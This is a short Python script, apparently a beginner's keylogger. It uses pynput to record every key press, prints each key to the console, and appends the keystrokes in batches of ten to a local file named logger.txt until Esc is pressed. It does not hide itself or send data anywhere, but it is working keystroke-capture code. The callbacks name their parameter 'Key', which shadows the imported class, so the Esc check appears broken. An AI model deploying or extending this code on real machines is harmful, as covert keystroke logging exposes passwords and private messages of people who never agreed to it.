# import required libraries
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(Key):
    global keys, count
    print("hello")
    keys.append(Key)
    count += 1
    print(f"{Key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)    # record keys into keys array
        keys = []
        
def write_file(keys):
    # store pressed keys into a txt file called logger.txt
    with open("logger.txt", "a") as f:
        for key in keys:
            f.write(str(key))

def on_release(Key):
    if Key == Key.esc:
        return False

with Listener(on_press= on_press, on_release = on_release) as listener:
    listener.join()